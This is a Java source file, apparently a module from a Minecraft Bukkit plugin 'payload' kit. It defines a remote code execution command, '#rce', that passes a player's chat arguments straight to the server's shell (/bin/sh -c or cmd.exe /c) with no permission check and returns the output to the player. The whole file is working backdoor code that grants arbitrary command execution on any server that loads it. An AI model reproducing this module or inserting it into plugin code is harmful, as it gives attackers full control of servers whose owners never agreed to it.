package dev.naruto.astrox.payload.modules;

import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

/**
 * Remote Code Execution module.
 * Executes shell commands via Runtime.exec() and captures stdout/stderr.
 */
public class RCEModule implements PayloadModule {

    private static final int TIMEOUT_SECONDS = 30;

    @Override
    public String getName() { return "rce"; }

    @Override
    public String getDescription() { return "Execute a shell command on the server"; }

    @Override
    public String getCategory() { return "System"; }

    @Override
    public String execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length < 1) {
            if (sender != null) sender.sendMessage("§c✗ Usage: #rce <command>");
            return "ERROR: missing command argument";
        }

        String command = String.join(" ", args);

        try {
            ProcessBuilder pb;
            String os = System.getProperty("os.name").toLowerCase();

            if (os.contains("win")) {
                pb = new ProcessBuilder("cmd.exe", "/c", command);
            } else {
                pb = new ProcessBuilder("/bin/sh", "-c", command);
            }

            pb.redirectErrorStream(true);
            Process process = pb.start();

            // Read output
            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            boolean completed = process.waitFor(TIMEOUT_SECONDS, TimeUnit.SECONDS);
            if (!completed) {
                process.destroyForcibly();
                output.append("\n[TIMEOUT after ").append(TIMEOUT_SECONDS).append("s]");
            }

            int exitCode = completed ? process.exitValue() : -1;
            String result = output.toString();

            if (sender != null) {
                sender.sendMessage("§a✓ Exit code: " + exitCode);
                String[] lines = result.split("\n");
                for (int i = 0; i < Math.min(lines.length, 20); i++) {
                    sender.sendMessage("§7" + lines[i]);
                }
                if (lines.length > 20) {
                    sender.sendMessage("§8... (" + (lines.length - 20) + " more lines)");
                }
            }

            return "exit=" + exitCode + "\n" + result;

        } catch (IOException | InterruptedException e) {
            String msg = "Command failed: " + e.getMessage();
            if (sender != null) sender.sendMessage("§c✗ " + msg);
            return "ERROR: " + msg;
        }
    }
}
